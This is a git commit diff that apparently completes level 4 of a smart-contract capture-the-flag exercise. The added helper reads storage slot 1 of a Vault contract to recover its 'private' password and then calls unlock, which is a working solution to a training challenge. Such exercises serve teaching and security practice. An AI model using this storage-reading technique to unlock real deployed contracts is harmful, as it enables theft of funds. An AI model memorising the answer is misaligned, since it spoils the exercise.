becae7e40a0cc878088b4d043f3b8a6f8a7d441a
Ricardo Pedroni <ricardo@endaoment.org>
2023-01-23 22:56:48 -0300

    complete level #4

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,14 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  // Only the ZK gods can make things private on a public blockchain, silly goose!
+  // Simply get the storage slot where `password` is stored
+  // Since `password` is 256 bits and `locked` is occupying the first word, let's get slot 1
+  const storage = await victim.provider.getStorageAt(victim.address, 1);
+  const password = ethers.utils.parseBytes32String(storage);
+  console.log(storage, password);
+
+  await victim.unlock(ethers.utils.formatBytes32String(password));
 };
 
 export default helper;
